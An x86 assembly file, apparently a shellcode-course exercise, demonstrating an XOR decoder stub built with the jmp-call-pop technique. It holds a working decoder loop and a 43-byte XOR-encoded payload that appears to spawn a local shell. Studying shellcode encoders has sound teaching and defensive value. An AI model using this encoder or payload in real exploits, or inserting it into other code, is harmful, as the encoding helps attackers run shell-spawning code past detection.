; Filename: xor-decoder_JmpCallPop.asm
; Author: Cameron, James
; Purpose: Demonstrate xor decoder stub shellcode using jmp call pop technique
; Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
;            Ubuntu 12.04.4 LTS



section .text

global _start

_start:

	jmp short call_decoder

decoder:
	pop esi             ; pop shellcode into esi
	xor ecx, ecx        ; sets ecx = 0
	mov cl, 43          ; length of shellcode (used by loop)

decode:
	xor byte [esi], 0xaa     ; xor key (in this case 0xaa is used)
	inc esi                  ; increments esi to the next byte to be xor'd
	loop decode              ; loops over decode until ecx = 0
	jmp short shellcode      ; passes control to shellcode once it's been de-mangled 

call_decoder:
	call decoder
	shellcode: db 0x9b, 0x6a, 0xc2, 0xe9, 0xe9, 0xe9, 0xe9, 0x23, 0xae, 0x8e, 0x23, 0x48, 0xc2, 0xe8, 0xe8, 0xe8, 0xe8, 0x23, 0x4b, 0xc2, 0x85, 0xd9, 0xc2, 0xeb, 0x22, 0xee, 0x8e, 0xa9, 0xc2, 0x85, 0xc8, 0xc3, 0xc4, 0x23, 0x49, 0x23, 0xce, 0x8e, 0xa2, 0x1a, 0xa1, 0x67, 0x2a
